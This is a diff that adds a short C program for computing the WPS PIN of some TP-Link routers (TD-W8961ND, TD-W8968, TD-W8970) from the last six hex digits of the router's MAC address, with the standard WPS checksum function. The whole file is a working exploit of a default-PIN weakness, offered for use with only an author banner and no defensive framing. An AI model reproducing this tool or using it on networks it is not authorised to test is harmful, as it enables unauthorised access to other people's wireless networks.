@@ -1,0 +1,38 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    unsigned int wps_pin_checksum(unsigned int pin);
+    int PIN = 0;
+    char repeat;
+    do{
+    	printf(" 					 +------------------------------------------------+\n");
+        printf("  					 |    Checking vulnerable keys of all routers:    |\n");
+        printf("  					 |        TD-W8961ND | TD-W8968 | TD-W8970        |\n");
+        printf("  					 |        VAIJINATH KACHRU AKHADE(Macaish)        |\n");
+        printf("  					 |             macaish@rediffmail.com             |\n");
+        printf("  					 +------------------------------------------------+");
+
+        printf("\n \n  \n 					 Input the last 6 digits of MAC Address(HEX):");
+        scanf("\n  					  %x",&PIN);
+        printf("\n		  	 		 Last 6 digits of MAC Address(HEX) are: %X\n",PIN);
+        printf("\n			 		 WPS PIN is: %07d%d\n",PIN%10000000,wps_pin_checksum(PIN%10000000));
+        printf("\n			 		 ReCalculate? (Y/N): ");
+        fflush(stdin);
+        repeat=getchar();
+    }while(repeat == 'Y' || repeat == 'y');
+}
+
+unsigned int wps_pin_checksum(unsigned int pin)
+{
+	unsigned int accum = 0;
+	while (pin)
+	{
+		accum += 3 * (pin % 10);
+		pin /= 10;
+		accum += pin % 10;
+		pin /= 10;
+	}
+    return (10 - accum % 10) % 10;
+}
